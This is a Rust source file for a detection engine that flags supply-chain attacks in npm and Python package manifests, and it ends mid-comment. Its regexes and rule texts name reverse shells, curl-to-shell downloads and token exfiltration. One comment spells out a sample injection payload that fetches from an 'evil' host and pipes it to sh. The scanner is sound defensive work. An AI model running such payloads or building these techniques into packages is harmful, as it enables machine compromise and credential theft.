//! Supply-chain attack detection engine.
//!
//! Detects:
//! - Malicious npm lifecycle scripts (preinstall/install/postinstall/prepare/
//!   prepublish/prepublishOnly) that shell out, download, base64-eval, read
//!   tokens, or are otherwise obfuscated.
//! - Bin-entry hijacking of well-known command names.
//! - Dependency-confusion-shaped package/dependency names (internal scopes,
//!   suspiciously high or zero versions).
//! - Token/secret exfiltration in install scripts (env-read + HTTP POST).
//! - `files`/`main`/`bin` pointers that escape the package directory.
//! - Python setup.py / pyproject.toml install hooks with the same patterns.
//!
//! All regex patterns are compiled once via [`std::sync::OnceLock`].

use std::sync::OnceLock;

use regex::Regex;
use serde_json::Value;
use tracing::warn;

use crate::engine::{DetectionEngine, FileKind, ScanContext};
use crate::types::{Confidence, FileLocation, Finding, Severity, ThreatCategory};

// ── engine name (must match every Finding::engine stamp) ────────────────────

const ENGINE: &str = "supply_chain";

// ── bundled allow-set for obviously-benign install-script shapes ─────────────
//
// These are prefix/exact patterns compiled as a single alternation and checked
// before any malice rules. Extending this list reduces FPs on common toolchains.

/// Benign script bodies that may appear in lifecycle hooks without suspicion.
/// Each entry is a full-line regex pattern that, if matched against the ENTIRE
/// script body (trimmed), means the script is considered benign.
//
// SECURITY: argument tokens use the safe charset [\w.,/:=@%+~*-] instead of the
// permissive `\S+`. `\S+` excludes only whitespace, so a no-whitespace shell
// payload (e.g. `npm run $(curl${IFS}http://evil|sh)`) matched a benign shape
// and short-circuited ALL malice/worm detection. The safe charset excludes the
// shell metacharacters `$ ( ) ` ; | & < > { }` and whitespace that a command
// injection needs, so such payloads no longer match the allow-list. Every
// pattern is also fully `^…$`-anchored so a benign prefix cannot wave through a
// chained command appended after a space.
static BENIGN_PATTERNS: &[&str] = &[
    // TypeScript compiler only
    r"^tsc(\s+--[\w.,/:=@%+~*-]+)*$",
    // Rollup / esbuild / swc / napi-rs / prebuildify build-only invocations
    r"^(rollup|esbuild|swc|napi|prebuildify)(\s+--?[\w.,/:=@%+~*-]+)*$",
    // node build.js / node index.js / node ./src/build.js — simple entry points
    r"^node\s+[\./]?[\w./-]+\.(?:js|cjs|mjs)(\s+--?[\w.,/:=@%+~*-]+)*$",
    // npm run sub-command (chains to a named script; analysed recursively)
    r"^npm\s+run\s+[\w.,/:=@%+~*-]+$",
    // yarn / pnpm equivalents of the above
    r"^(yarn|pnpm)\s+(build|compile|run\s+[\w.,/:=@%+~*-]+)(\s+--?[\w.,/:=@%+~*-]+)*$",
    // Standard cmake / make / cargo build lines (native addons via node-gyp)
    r"^(node-gyp|cmake-js|cmake|make)\s+(rebuild|configure|build|install)(\s+--?[\w.,/:=@%+~*-]+)*$",
    // patch-package — legitimate postinstall usage
    r"^patch-package$",
    // husky install (git-hooks bootstrap; only valid in devDependencies context
    // but we can't know that here, so allow the pattern)
    r"^husky\s+install$",
    // prisma generate / prisma db push
    r"^prisma\s+(generate|db\s+push|migrate\s+deploy)$",
    // Sentry CLI sourcemaps upload
    r"^sentry-cli\s+(releases?|sourcemaps)(\s+[\w.,/:=@%+~*-]+)+$",
    // electron-builder / electron-rebuild
    r"^(electron-builder|electron-rebuild)(\s+--?[\w.,/:=@%+~*-]+)*$",
    // rimraf / mkdirp / copyfiles — filesystem helpers only
    r"^(rimraf|mkdirp|copyfiles)(\s+[\w.,/:=@%+~*-]+)+$",
    // Simple echo-only scripts (package prints a message, no redirect/pipe/chain)
    r"^echo\s+[^|>&;]+$",
    // tsc + node chained: `tsc && node dist/...`
    r"^tsc(\s+--[\w.,/:=@%+~*-]+)*\s*&&\s*node\s+[\./]?[\w./-]+\.(?:js|cjs|mjs)(\s+--?[\w.,/:=@%+~*-]+)*$",
];

// ── well-known command names that 'bin' entries must not shadow ──────────────

/// Commands that a malicious bin hijack would target.
static HIJACK_TARGETS: &[&str] = &[
    "sh",
    "bash",
    "zsh",
    "fish",
    "dash",
    "ksh",
    "node",
    "nodejs",
    "npm",
    "npx",
    "yarn",
    "pnpm",
    "git",
    "git-core",
    "pip",
    "pip3",
    "python",
    "python3",
    "py",
    "ruby",
    "gem",
    "rake",
    "bundler",
    "go",
    "cargo",
    "rustc",
    "curl",
    "wget",
    "fetch",
    "sudo",
    "su",
    "doas",
    "ssh",
    "scp",
    "sftp",
    "rsync",
    "aws",
    "gcloud",
    "az",
    "kubectl",
    "helm",
    "docker",
    "docker-compose",
    "podman",
    "openssl",
    "gpg",
    "gpg2",
    "env",
    "xargs",
    "exec",
];

// ── scoped-name prefixes that suggest internal/private packages ──────────────

/// Scope prefixes that, when published publicly to the default registry,
/// are likely dependency-confusion probes.
static INTERNAL_SCOPE_PREFIXES: &[&str] = &[
    "@internal",
    "@private",
    "@local",
    "@corp",
    "@company",
    "@enterprise",
    "@intranet",
    "@dev", // ambiguous but common in confusion attacks
    "@test",
    "@staging",
    "@infra",
    "@ops",
    "@mycompany",
    "@acme",
    "@example",
];

// ── version patterns that are typical of dependency-confusion attacks ─────────

/// Semver strings typical of confusion probes: very high major, or 0.0.0.
static CONFUSION_VERSION_RE: OnceLock<Regex> = OnceLock::new();
fn confusion_version_re() -> &'static Regex {
    CONFUSION_VERSION_RE.get_or_init(|| {
        // 99.x.x / 9999.x.x etc., or exactly 0.0.0
        Regex::new(r"^(?:9{2,}|0\.0\.0)").expect("invariant: static regex is valid")
    })
}

// ── lifecycle script malice patterns ─────────────────────────────────────────

/// Patterns compiled once; each entry is (rule_id, title, category, severity,
/// confidence, regex_source).  Order matters: first match wins for per-rule
/// reporting, but ALL matches are reported (each yields a distinct Finding).
struct ScriptRule {
    rule_id: &'static str,
    title: &'static str,
    category: ThreatCategory,
    severity: Severity,
    confidence: Confidence,
    description: &'static str,
}

static SCRIPT_RULES: &[ScriptRule] = &[
    ScriptRule {
        rule_id: "SC_INSTALL_CURL_PIPE_SHELL",
        title: "Install script pipes curl/wget output into a shell",
        category: ThreatCategory::InstallScript,
        severity: Severity::High,
        confidence: Confidence::High,
        description: "Downloading and immediately executing remote code is the canonical npm malware \
                       delivery pattern. Any network fetch piped to bash/sh/node is a strong \
                       indicator of a supply-chain attack.",
    },
    ScriptRule {
        rule_id: "SC_INSTALL_BASE64_EVAL",
        title: "Install script base64-decodes and evals a payload",
        category: ThreatCategory::InstallScript,
        severity: Severity::High,
        confidence: Confidence::High,
        description: "Base64 decoding combined with eval/exec is a standard obfuscation technique \
                       for hiding malicious payloads from static analysis.",
    },
    ScriptRule {
        rule_id: "SC_INSTALL_NODE_EVAL",
        title: "Install script passes a payload string to `node -e`",
        category: ThreatCategory::InstallScript,
        severity: Severity::High,
        confidence: Confidence::High,
        description: "`node -e '...'` is frequently used to run obfuscated or inline payloads \
                       without a separate file that could be inspected.",
    },
    ScriptRule {
        rule_id: "SC_INSTALL_FETCH_EXEC",
        title: "Install script fetches and executes a remote payload",
        category: ThreatCategory::InstallScript,
        severity: Severity::High,
        confidence: Confidence::High,
        description: "Spawning a child process from a downloaded script or binary is equivalent \
                       to curl|bash from within Node.",
    },
    ScriptRule {
        rule_id: "SC_INSTALL_TOKEN_EXFIL",
        title: "Install script reads secrets and POSTs them outbound",
        category: ThreatCategory::Exfiltration,
        severity: Severity::High,
        confidence: Confidence::High,
        description: "Reading NPM_TOKEN/GH_TOKEN/CI credentials and making an outbound HTTP request \
                       is the primary exfiltration vector in npm malware campaigns.",
    },
    ScriptRule {
        rule_id: "SC_INSTALL_REVERSE_SHELL",
        title: "Install script opens a reverse shell",
        category: ThreatCategory::InstallScript,
        severity: Severity::Critical,
        confidence: Confidence::High,
        description: "A netcat, bash /dev/tcp, or socat reverse-shell in a lifecycle script gives \
                       an attacker interactive access to the victim machine on npm install.",
    },
    ScriptRule {
        rule_id: "SC_INSTALL_ENV_DUMP",
        title: "Install script dumps process environment to a network endpoint",
        category: ThreatCategory::Exfiltration,
        severity: Severity::High,
        confidence: Confidence::High,
        description: "Exfiltrating `env` output or `process.env` to an attacker-controlled host \
                       leaks all secrets present in the CI/CD environment.",
    },
    ScriptRule {
        rule_id: "SC_INSTALL_OBFUSCATED",
        title: "Install script contains obfuscated / encoded payload",
        category: ThreatCategory::Obfuscation,
        severity: Severity::High,
        confidence: Confidence::Medium,
        description: "Long base64 strings, hex-encoded data, or heavily chained String.fromCharCode \
                       calls in an install script are a strong obfuscation indicator.",
    },
    ScriptRule {
        rule_id: "SC_INSTALL_SPAWN_SH",
        title: "Install script spawns a shell interpreter directly",
        category: ThreatCategory::CommandExecution,
        severity: Severity::Medium,
        confidence: Confidence::Medium,
        description: "Spawning /bin/sh, /bin/bash, or cmd.exe from an install hook is unusual; \
                       combined with other signals it indicates malicious intent.",
    },
    ScriptRule {
        rule_id: "SC_INSTALL_NPM_PUBLISH_IN_HOOK",
        title: "Install script calls `npm publish` — token-theft self-propagation",
        category: ThreatCategory::SupplyChain,
        severity: Severity::High,
        confidence: Confidence::High,
        description: "Calling `npm publish` from a lifecycle hook is how worm-like malware \
                       propagates itself through npm organisations using stolen tokens.",
    },
    ScriptRule {
        rule_id: "SC_INSTALL_WRITE_CRON",
        title: "Install script installs a cron job or launchd plist",
        category: ThreatCategory::FilesystemAbuse,
        severity: Severity::High,
        confidence: Confidence::Medium,
        description: "Writing to cron directories or /Library/LaunchDaemons from a lifecycle hook \
                       establishes post-install persistence.",
    },
    ScriptRule {
        rule_id: "SC_INSTALL_CRYPTO_MINER",
        title: "Install script references a cryptocurrency miner",
        category: ThreatCategory::CryptoStealer,
        severity: Severity::High,
        confidence: Confidence::High,
        description: "Keywords associated with xmrig, minerd, or stratum mining pools in an \
                       install script indicate coinminer delivery.",
    },
];

/// Compile the per-rule regexes lazily; index aligns with SCRIPT_RULES.
static SCRIPT_REGEXES: OnceLock<Vec<Regex>> = OnceLock::new();

fn script_regexes() -> &'static [Regex] {
    SCRIPT_REGEXES.get_or_init(|| {
        // Must stay in the same order as SCRIPT_RULES.
        let patterns: &[&str] = &[
            // SC_INSTALL_CURL_PIPE_SHELL
            r"(?i)\b(curl|wget|fetch)\b[^|;\n]*\|[^|;\n]*\b(ba?sh|sh|zsh|dash|ksh|node|python3?|ruby|perl)\b",
            // SC_INSTALL_BASE64_EVAL
            r"(?i)(atob|Buffer\.from\b[^;]*base64|base64\s+-d)\s*[^;]*(?:eval|Function|exec\b|spawn\b)",
            // SC_INSTALL_NODE_EVAL  — `node -e` or `node --eval` with a quoted payload
            r#"(?i)\bnode\s+(?:-e|--eval)\s+['"`]"#,
            // SC_INSTALL_FETCH_EXEC — download then exec (child_process, execFile, spawn, etc.)
            r#"(?i)(https?://[^\s'"]+)\s*[^;]*(?:execFile|spawn|execSync|spawnSync|child_process|\.exec\(|\.spawn\(|require\s*\(\s*['"]child_process)"#,
            // SC_INSTALL_TOKEN_EXFIL — env token + outbound request (any order on the line)
            r"(?i)(?:(?:NPM_TOKEN|GH_TOKEN|GITHUB_TOKEN|CI_JOB_TOKEN|CIRCLE_TOKEN|TRAVIS_TOKEN|AWS_SECRET|AZURE_SUBSCRIPTION)[^\n]*(?:curl|wget|axios|fetch|http\.(?:get|post|request))|(?:curl|wget|axios|fetch|http\.(?:get|post|request))[^\n]*(?:NPM_TOKEN|GH_TOKEN|GITHUB_TOKEN|CI_JOB_TOKEN|CIRCLE_TOKEN|TRAVIS_TOKEN|AWS_SECRET|AZURE_SUBSCRIPTION))",
            // SC_INSTALL_REVERSE_SHELL
            r"(?i)(?:nc\s+-[eln]+\s+\d|/dev/tcp/|socat\s+TCP(?:4)?:|bash\s+-i\s*>&\s*/dev/tcp)",
            // SC_INSTALL_ENV_DUMP — process.env sent outbound or `env |` piped (any order)
            r"(?i)(?:(?:process\.env|/usr/bin/env|printenv|/proc/self/environ)[^\n]*(?:curl|wget|fetch|axios|http\.(?:get|post|request))|(?:curl|wget|fetch|axios|http\.(?:get|post|request))[^\n]*(?:process\.env|printenv|/proc/self/environ))",
            // SC_INSTALL_OBFUSCATED — long base64 blob (≥64 chars without spaces), hex string, or fromCharCode chain
            r#"(?i)(?:[A-Za-z0-9+/=]{64,}|(?:\\x[0-9a-f]{2}){16,}|String\.fromCharCode(?:\(\s*\d+\s*,){8,})"#,
            // SC_INSTALL_SPAWN_SH — direct shell spawn
            r#"(?i)(?:execSync|spawnSync|exec\b|spawn\b)\s*\(\s*['"`](?:/bin/(?:ba?sh|sh|dash|zsh)|cmd\.exe|powershell)"#,
            // SC_INSTALL_NPM_PUBLISH_IN_HOOK
            r"(?i)\bnpm\s+publish\b",
            // SC_INSTALL_WRITE_CRON — cron/launchd persistence
            r"(?i)(?:/etc/cron\.|/var/spool/cron|crontab\s+-|/Library/Launch(?:Daemons|Agents)|/etc/launchd)",
            // SC_INSTALL_CRYPTO_MINER
            r"(?i)(?:xmrig|minerd|stratum\+tcp://|pool\.minexmr|hashrate|cryptonight)",
        ];
        patterns
            .iter()
            .map(|p| Regex::new(p).expect("invariant: static supply_chain regex is valid"))
            .collect()
    })
}

/// Single alternation of benign patterns — if the ENTIRE trimmed script body
/// matches any of these, the script is considered clean before malice checks.
static BENIGN_RE: OnceLock<Regex> = OnceLock::new();
fn benign_re() -> &'static Regex {
    BENIGN_RE.get_or_init(|| {
        let alts = BENIGN_PATTERNS.join("|");
        let src = format!("^(?:{})$", alts);
        Regex::new(&src).expect("invariant: static benign alternation is valid")
    })
}

// ── files/main/bin path-escape pattern ───────────────────────────────────────

static PATH_ESCAPE_RE: OnceLock<Regex> = OnceLock::new();
fn path_escape_re() -> &'static Regex {
    PATH_ESCAPE_RE.get_or_init(|| {
        Regex::new(r"(?:^\.\./|/\.\./|^/)").expect("invariant: static regex is valid")
    })
}

// ── Python install-hook patterns ──────────────────────────────────────────────

static PYTHON_HOOK_RE: OnceLock<Regex> = OnceLock::new();
fn python_hook_re() -> &'static Regex {
    PYTHON_HOOK_RE.get_or_init(|| {
        // setup.py: class that overrides run() + os.system/subprocess, or
        // a direct subprocess call inside the install section.
        Regex::new(r"(?i)(?:class\s+\w+\s*\(\s*install\s*\)|def\s+run\s*\(self\))[^}]*(?:os\.system|subprocess\.\w+|urllib\.request|requests\.(?:get|post)|curl|wget)")
            .expect("invariant: static regex is valid")
    })
}

static PYPROJECT_BUILD_HOOK_RE: OnceLock<Regex> = OnceLock::new();
fn pyproject_build_hook_re() -> &'static Regex {
    PYPROJECT_BUILD_HOOK_RE.get_or_init(|| {
        // Detects pyproject.toml build-backend hooks that execute shell commands
        Regex::new(r#"(?i)build-backend\s*=\s*"[^"]*"\s*[^\[]*\[tool\.\w+\.[^\]]*\]\s*[^\[]*(?:pre_install|post_install|on_install)\s*="#)
            .expect("invariant: static regex is valid")
    })
}

// ── Non-registry host pattern ─────────────────────────────────────────────────

/// Official npm/yarn/node registry and release hostnames that should not
/// trigger the non-registry-URL finding when seen in lifecycle hooks.
static REGISTRY_ALLOW_HOSTS: &[&str] = &[
    "registry.npmjs.org",
    "registry.yarnpkg.com",
    "registry.npmmirror.com",
    "nodejs.org",
];

/// Matches any http(s) URL in a lifecycle hook body; callers filter
/// against [`REGISTRY_ALLOW_HOSTS`] and the github releases pattern.
/// The `regex` crate does not support look-around, so the allow-list
/// check is performed in Rust rather than inline in the pattern.
static URL_RE: OnceLock<Regex> = OnceLock::new();
fn url_re() -> &'static Regex {
    URL_RE.get_or_init(|| {
        Regex::new(r#"(?i)https?://[^\s'"<>]+"#).expect("invariant: static regex is valid")
    })
}

/// True if `url` points to an official registry or a github releases CDN path.
fn is_registry_url(url: &str) -> bool {
    let lower = url.to_ascii_lowercase();
    // Strip scheme
    let after_scheme = lower
        .strip_prefix("https://")
        .or_else(|| lower.strip_prefix("http://"))
        .unwrap_or(&lower);
    // Host-only (no path)
    let host = after_scheme.split('/').next().unwrap_or(after_scheme);
    if REGISTRY_ALLOW_HOSTS.contains(&host) {
        return true;
    }
    // github.com/<owner>/<repo>/releases/ — legitimate release downloads
    if after_scheme.starts_with("github.com/") {
        let parts: Vec<&str> = after_scheme.splitn(5, '/').collect();
        // parts: ["github.com", owner, repo, "releases", ...]
        if parts.len() >= 4 && parts[3] == "releases" {
            return true;
        }
    }
    false
}

// ── The engine ────────────────────────────────────────────────────────────────

/// Supply-chain attack detection engine for npm (and partially Python) packages.
///
/// Implements [`DetectionEngine`]; build with [`SupplyChainEngine::default()`].
#[derive(Debug, Default)]
pub struct SupplyChainEngine;

impl SupplyChainEngine {
    /// Analyse the `scripts` object of a parsed `package.json` value.
    fn check_lifecycle_scripts(&self, pkg: &Value, path: &str, findings: &mut Vec<Finding>) {
        let scripts = match pkg.get("scripts").and_then(|v| v.as_object()) {
            Some(s) => s,
            None => return,
        };

        let lifecycle_hooks: &[&str] = &[
            "preinstall",
            "install",
            "postinstall",
            "prepare",
            "prepublish",
            "prepublishOnly",
            // pack-time hooks run when a module is packed — including when a
            // dependency is installed directly from a git URL or a tarball, a
            // common supply-chain vector. A `prepack`-only payload was invisible.
            "prepack",
            "postpack",
        ];

        let benign = benign_re();
        let regexes = script_regexes();

        for hook in lifecycle_hooks {
            let body = match scripts.get(*hook).and_then(|v| v.as_str()) {
                Some(s) => s,
                None => continue,
            };

            let trimmed = body.trim();
            if trimmed.is_empty() {
                continue;
            }

            // Benign allow-set: if the entire trimmed body matches, skip malice checks.
            if benign.is_match(trimmed) {
                continue;
            }

            // Run every malice rule; report each that fires.
            for (i, rule) in SCRIPT_RULES.iter().enumerate() {
                let re = match regexes.get(i) {
                    Some(r) => r,
                    None => {
                        warn!(
                            rule_id = rule.rule_id,
                            "supply_chain: regex index out of sync with rule table"
                        );
                        continue;
                    }
                };

                if re.is_match(trimmed) {
                    let evidence = format!("scripts.{hook}: {trimmed}");
                    let f = Finding::new(
                        ENGINE,
                        rule.category,
                        rule.severity,
                        rule.confidence,
                        rule.title,
                        rule.description,
                    )
                    .with_rule_id(rule.rule_id)
                    .with_location(FileLocation::file(path))
                    .with_evidence(evidence, 160);
                    findings.push(f);
                }
            }

            // Worm-propagation supplemental rules — same hook body, no benign re-check
            // (the benign guard above already filtered; we reach this only for non-benign).
            self.check_worm_script_rules(hook, trimmed, path, findings);

            // Non-registry URL in lifecycle hook — separate check.
            // The `regex` crate lacks look-around, so we match any URL and
            // filter against the known-safe registry allow-list in Rust.
            for m in url_re().find_iter(trimmed) {
                if is_registry_url(m.as_str()) {
                    continue;
                }
                let evidence = format!("scripts.{hook}: {}", m.as_str());
                let f = Finding::new(
                    ENGINE,
                    ThreatCategory::Network,
                    Severity::Medium,
                    Confidence::Medium,
                    "Install script contacts non-registry host",
                    "A lifecycle hook reaches out to a host that is not the npm registry. \
                     This may be benign (CDN asset fetch) but warrants review.",
                )
                .with_rule_id("SC_INSTALL_NON_REGISTRY_URL")
                .with_location(FileLocation::file(path))
                .with_evidence(evidence, 160);
                findings.push(f);
            }
        }
    }

    /// Check `bin` entries for hijacking of well-known command names.
    fn check_bin_hijack(&self, pkg: &Value, path: &str, findings: &mut Vec<Finding>) {
        let bin = match pkg.get("bin") {
            Some(b) => b,
            None => return,
        };

        let names: Vec<&str> = match bin {
            // "bin": "path/to/cli"  — the command name is the package name
            Value::String(_) => {
                let pkg_name = pkg.get("name").and_then(|v| v.as_str()).unwrap_or("");
                // Strip leading @ scope if present
                let bare = pkg_name.rsplit('/').next().unwrap_or(pkg_name);
                vec![bare]
            }
            Value::Object(map) => map.keys().map(|k| k.as_str()).collect(),
            _ => return,
        };

        for name in names {
            if HIJACK_TARGETS.contains(&name) {
                let evidence = format!("bin entry: {name}");
                let f = Finding::new(
                    ENGINE,
                    ThreatCategory::SupplyChain,
                    Severity::High,
                    Confidence::High,
                    "Bin entry hijacks a well-known system command",
                    "A `bin` field in package.json maps a well-known executable name (e.g. `node`, \
                     `git`, `curl`) to a file inside this package. If this package is installed \
                     globally or as a workspace tool it will shadow the real binary, allowing \
                     arbitrary code execution when that command is invoked.",
                )
                .with_rule_id("SC_BIN_HIJACK_KNOWN_CMD")
                .with_location(FileLocation::file(path))
                .with_evidence(evidence, 160);
                findings.push(f);
            }
        }
    }

    /// Check the package name itself and its declared dependencies for
    /// dependency-confusion indicators.
    fn check_dependency_confusion(&self, pkg: &Value, path: &str, findings: &mut Vec<Finding>) {
        let version_re = confusion_version_re();

        // 1. Check the package name itself.
        if let Some(name) = pkg.get("name").and_then(|v| v.as_str()) {
            if self.is_confusion_scoped_name(name) {
                let f = Finding::new(
                    ENGINE,
                    ThreatCategory::DependencyConfusion,
                    Severity::High,
                    Confidence::High,
                    "Package name resembles an internal/private scoped package",
                    "Scoped names like @internal/, @private/, @corp/ are typically used for \
                     organisation-internal packages. Publishing such a name to the public \
                     registry is a hallmark of dependency-confusion attacks.",
                )
                .with_rule_id("SC_DEP_CONFUSION_SCOPED_NAME")
                .with_location(FileLocation::file(path))
                .with_evidence(format!("name: {name}"), 160);
                findings.push(f);
            }

            // Check for version that is 0.0.0 or 99+.x
            if let Some(ver) = pkg.get("version").and_then(|v| v.as_str())
                && version_re.is_match(ver)
            {
                let evidence = format!("name: {name}, version: {ver}");
                let f = Finding::new(
                    ENGINE,
                    ThreatCategory::DependencyConfusion,
                    Severity::High,
                    Confidence::Medium,
                    "Package version is anomalous (confusion-probe pattern)",
                    "Version strings like 0.0.0, 99.0.0, or 9999.0.0 are characteristic \
                     of dependency-confusion probes: the attacker publishes a public package \
                     at a higher version than the internal one so that the resolver prefers \
                     the malicious public copy.",
                )
                .with_rule_id("SC_DEP_CONFUSION_VERSION")
                .with_location(FileLocation::file(path))
                .with_evidence(evidence, 160);
                findings.push(f);
            }
        }

        // 2. Check declared dependencies (dependencies, devDependencies, peerDependencies).
        let dep_keys: &[&str] = &[
            "dependencies",
            "devDependencies",
            "peerDependencies",
            "optionalDependencies",
        ];
        for key in dep_keys {
            if let Some(deps) = pkg.get(key).and_then(|v| v.as_object()) {
                for (dep_name, dep_ver) in deps {
                    // Scoped confusion name in a dependency.
                    if self.is_confusion_scoped_name(dep_name) {
                        let evidence = format!("{key}.{dep_name}");
                        let f = Finding::new(
                            ENGINE,
                            ThreatCategory::DependencyConfusion,
                            Severity::Medium,
                            Confidence::Medium,
                            "Dependency name resembles an internal/private scoped package",
                            "A dependency with an internal-looking scope (@internal, @corp, etc.) \
                             may be intended as a private package that an attacker could squash on \
                             the public registry to gain code execution at install time.",
                        )
                        .with_rule_id("SC_DEP_CONFUSION_DEP_SCOPED")
                        .with_location(FileLocation::file(path))
                        .with_evidence(evidence, 160);
                        findings.push(f);
                    }

                    // Confusion version in a dependency spec.
                    let ver_str = dep_ver.as_str().unwrap_or("");
                    let bare = ver_str
                        .trim_start_matches('^')
                        .trim_start_matches('~')
                        .trim_start_matches('=');
                    if version_re.is_match(bare) {
                        let evidence = format!("{key}.{dep_name}: {ver_str}");
                        let f = Finding::new(
                            ENGINE,
                            ThreatCategory::DependencyConfusion,
                            Severity::Medium,
                            Confidence::Medium,
                            "Dependency pinned to anomalous version (confusion-probe pattern)",
                            "An extremely high or zero version specifier on a dependency may be \
                             a dependency-confusion probe: the attacker's public package at that \
                             version will shadow any internal package with the same name.",
                        )
                        .with_rule_id("SC_DEP_CONFUSION_DEP_VERSION")
                        .with_location(FileLocation::file(path))
                        .with_evidence(evidence, 160);
                        findings.push(f);
                    }
                }
            }
        }
    }

    /// Check `files` array and `main`/`exports` for path-escape entries.
    fn check_path_escape(&self, pkg: &Value, path: &str, findings: &mut Vec<Finding>) {
        let escape = path_escape_re();

        // `files` array
        if let Some(files) = pkg.get("files").and_then(|v| v.as_array()) {
            for f_val in files {
                let f_str = f_val.as_str().unwrap_or("");
                if escape.is_match(f_str) {
                    let evidence = format!("files: {f_str}");
                    let finding = Finding::new(
                        ENGINE,
                        ThreatCategory::FilesystemAbuse,
                        Severity::High,
                        Confidence::High,
                        "Package `files` field escapes the package directory",
                        "A `files` entry containing `../` or an absolute path references content \
                         outside the package root. npm may resolve these and include arbitrary \
                         host-filesystem paths in the published tarball.",
                    )
                    .with_rule_id("SC_FILES_PATH_ESCAPE")
                    .with_location(FileLocation::file(path))
                    .with_evidence(evidence, 160);
                    findings.push(finding);
                }
            }
        }

        // `main` field
        if let Some(main) = pkg.get("main").and_then(|v| v.as_str())
            && escape.is_match(main)
        {
            let evidence = format!("main: {main}");
            let finding = Finding::new(
                ENGINE,
                ThreatCategory::FilesystemAbuse,
                Severity::High,
                Confidence::High,
                "Package `main` field escapes the package directory",
                "The `main` entry point traverses above the package root via `../`. \
                 Requiring this package will load an arbitrary file from the host filesystem.",
            )
            .with_rule_id("SC_MAIN_PATH_ESCAPE")
            .with_location(FileLocation::file(path))
            .with_evidence(evidence, 160);
            findings.push(finding);
        }
    }

    /// True if `name` uses a scope prefix associated with private/internal packages.
    fn is_confusion_scoped_name(&self, name: &str) -> bool {
        if !name.starts_with('@') {
            return false;
        }
        // Normalise to lowercase for comparison
        let lower = name.to_ascii_lowercase();
        INTERNAL_SCOPE_PREFIXES
            .iter()
            .any(|prefix| lower.starts_with(prefix))
    }
}

// ── Python setup.py / pyproject.toml analysis ────────────────────────────────

impl SupplyChainEngine {
    fn check_python_install_hooks(&self, text: &str, file_path: &str, findings: &mut Vec<Finding>) {
        // setup.py: custom install command that runs OS commands
        if python_hook_re().is_match(text) {
            let finding = Finding::new(
                ENGINE,
                ThreatCategory::InstallScript,
                Severity::High,
                Confidence::Medium,
                "setup.py defines a custom install command with shell execution",
                "Overriding `install.run()` in setup.py and calling os.system / subprocess \
                 is the Python equivalent of a malicious npm postinstall script. It executes \
                 arbitrary code when the package is pip-installed.",
            )
            .with_rule_id("SC_PYTHON_SETUP_CUSTOM_INSTALL")
            .with_location(FileLocation::file(file_path));
            findings.push(finding);
        }

        // Run all lifecycle script malice rules over setup.py text too —
        // many attacks share the same patterns (curl|bash, base64, etc.)
        let benign = benign_re();
        if benign.is_match(text.trim()) {
            return;
        }
        let regexes = script_regexes();
        for (i, rule) in SCRIPT_RULES.iter().enumerate() {
            let re = match regexes.get(i) {
                Some(r) => r,
                None => continue,
            };
            if re.is_match(text) {
                let f = Finding::new(
                    ENGINE,
                    rule.category,
                    rule.severity,
                    rule.confidence,
                    rule.title,
                    rule.description,
                )
                .with_rule_id(rule.rule_id)
                .with_location(FileLocation::file(file_path));
                findings.push(f);
            }
        }
    }
}

// ── DetectionEngine impl ──────────────────────────────────────────────────────

impl DetectionEngine for SupplyChainEngine {
    fn name(&self) -> &'static str {
        ENGINE
    }

    fn scan(&self, ctx: &ScanContext<'_>) -> Vec<Finding> {
        let mut findings: Vec<Finding> = Vec::new();

        // 1. Analyse the pre-parsed package.json (if any).
        if let Some(pkg) = ctx.package_json {
            // Locate the path of the package.json file for location annotations.
            let pkg_path = ctx
                .files
                .iter()
                .find(|f| {
                    let lower = f.rel_path.to_ascii_lowercase();
                    lower == "package.json" || lower.ends_with("/package.json")
                })
                .map(|f| f.rel_path.as_str())
                .unwrap_or("package.json");

            self.check_lifecycle_scripts(pkg, pkg_path, &mut findings);
            self.check_bin_hijack(pkg, pkg_path, &mut findings);
            self.check_dependency_confusion(pkg, pkg_path, &mut findings);
            self.check_path_escape(pkg, pkg_path, &mut findings);
            // SC-01: Sigstore attestation signer-delta.
            self.check_attestation_signer_delta(pkg, pkg_path, ctx.files, &mut findings);
            // SC-03: Version inflation (major 50..98).
            self.check_version_inflation(pkg, pkg_path, &mut findings);
            // SC-04: Maintainer-impersonation account name.
            self.check_maintainer_impersonation(pkg, pkg_path, &mut findings);
            // SC-05: DLL in pure-JS package.
            self.check_dll_in_pure_js_package(pkg, pkg_path, ctx.files, &mut findings);
            // SC-07: Protest / meme version.
            self.check_protest_version(pkg, pkg_path, &mut findings);
            // SC-08: Fake internal URL in metadata.
            self.check_fake_internal_url(pkg, pkg_path, &mut findings);
        }

        // 2. Walk all files and check manifest FileKind files we haven't already
        //    covered, plus Python install hooks.
        for file in ctx.files.iter() {
            if !file.looks_textual() {
                continue;
            }
            let rel = &file.rel_path;
            let lower = rel.to_ascii_lowercase();

            // Any manifest file that wasn't the top-level package.json: re-parse
            // and run the same checks (monorepo sub-package, nested tarball, etc.)
            if file.kind == FileKind::Manifest
                && lower != "package.json"
                && lower.ends_with("package.json")
            {
                let text = file.text_lossy();
                match serde_json::from_str::<Value>(&text) {
                    Ok(pkg) => {
                        self.check_lifecycle_scripts(&pkg, rel, &mut findings);
                        self.check_bin_hijack(&pkg, rel, &mut findings);
                        self.check_dependency_confusion(&pkg, rel, &mut findings);
                        self.check_path_escape(&pkg, rel, &mut findings);
                        self.check_version_inflation(&pkg, rel, &mut findings);
                        self.check_maintainer_impersonation(&pkg, rel, &mut findings);
                        self.check_dll_in_pure_js_package(&pkg, rel, ctx.files, &mut findings);
                        self.check_protest_version(&pkg, rel, &mut findings);
                        self.check_fake_internal_url(&pkg, rel, &mut findings);
                    }
                    Err(e) => {
                        warn!(path = rel, error = %e, "supply_chain: failed to parse sub-package.json");
                    }
                }
            }

            // Python install hooks: setup.py and pyproject.toml
            if file.kind == FileKind::Python && lower.ends_with("setup.py") {
                let text = file.text_lossy();
                self.check_python_install_hooks(&text, rel, &mut findings);
            }

            // pyproject.toml (kind will typically be Text or Manifest)
            if lower.ends_with("pyproject.toml") {
                let text = file.text_lossy();
                if pyproject_build_hook_re().is_match(&text) {
                    let f = Finding::new(
                        ENGINE,
                        ThreatCategory::InstallScript,
                        Severity::Medium,
                        Confidence::Low,
                        "pyproject.toml defines a build-backend install hook",
                        "Custom install hooks defined in pyproject.toml execute during \
                         pip install. Review the hook body for malicious activity.",
                    )
                    .with_rule_id("SC_PYTHON_PYPROJECT_INSTALL_HOOK")
                    .with_location(FileLocation::file(rel));
                    findings.push(f);
                }
            }
        }

        findings
    }
}

// ── SC-01: Sigstore attestation signer-delta signal ──────────────────────────
//
// Detectable when the package tarball includes attestation metadata files
